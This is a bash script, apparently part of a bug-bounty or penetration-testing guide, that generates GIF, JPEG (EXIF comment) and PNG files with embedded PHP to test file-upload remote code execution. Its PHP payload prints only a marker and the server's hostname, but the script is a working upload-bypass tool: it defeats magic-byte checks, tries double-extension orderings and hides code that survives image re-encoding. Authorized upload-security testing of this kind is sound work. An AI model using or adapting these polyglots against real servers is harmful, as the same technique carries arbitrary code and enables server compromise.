#!/usr/bin/env bash
# make_polyglot.sh — build BENIGN image+code polyglot marker files (guide §8).
# Authorized testing only. The embedded PHP only prints a marker (proves execution); not a backdoor.
# Delete uploaded files after the PoC (guide §26).
set -u
MARK='RCE-POC-'"$(echo -n yourhandle-unique-2026 | md5sum 2>/dev/null | cut -d" " -f1)"
OUT=out_polyglot; mkdir -p "$OUT"

# 1) GIF + PHP (magic bytes GIF89a satisfy magic-byte checks; PHP runs if executed)
printf 'GIF89a;\n<?php echo "%s-".php_uname("n"); ?>\n' "$MARK" > "$OUT/shell.gif.php"
cp "$OUT/shell.gif.php" "$OUT/shell.php.gif"   # try both extension orders (guide §7)

# 2) JPEG + PHP via EXIF Comment (often survives image re-encoding; guide §11)
if command -v exiftool >/dev/null && command -v convert >/dev/null; then
  convert -size 32x32 xc:white "$OUT/_clean.jpg" 2>/dev/null
  exiftool -overwrite_original -Comment='<?php echo "'"$MARK"'-".php_uname("n"); ?>' "$OUT/_clean.jpg" >/dev/null 2>&1
  cp "$OUT/_clean.jpg" "$OUT/shell.jpg.php"
  echo "[+] $OUT/shell.jpg.php  (EXIF-comment PHP; may survive re-encoding)"
else
  echo "[i] install exiftool + imagemagick for the JPEG/EXIF polyglot"
fi

# 3) PNG + appended PHP (for servers that store as-is)
if command -v convert >/dev/null; then
  convert -size 32x32 xc:white "$OUT/_clean.png" 2>/dev/null
  cp "$OUT/_clean.png" "$OUT/shell.php.png"
  printf '\n<?php echo "%s-".php_uname("n"); ?>\n' "$MARK" >> "$OUT/shell.php.png"
fi

echo "[+] polyglots in $OUT/  (marker: $MARK)"
echo "[i] Upload one, then request its URL; seeing the marker = RCE (guide §12). DELETE after."
